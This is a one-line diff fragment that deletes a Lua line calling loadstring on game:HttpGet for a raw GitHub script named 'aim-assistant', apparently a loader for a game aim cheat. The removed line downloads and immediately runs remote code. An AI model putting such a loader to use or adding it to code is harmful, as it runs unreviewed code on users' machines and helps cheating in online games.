@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/paygammy/aim-assistant/release/scripts/main.lua"))()
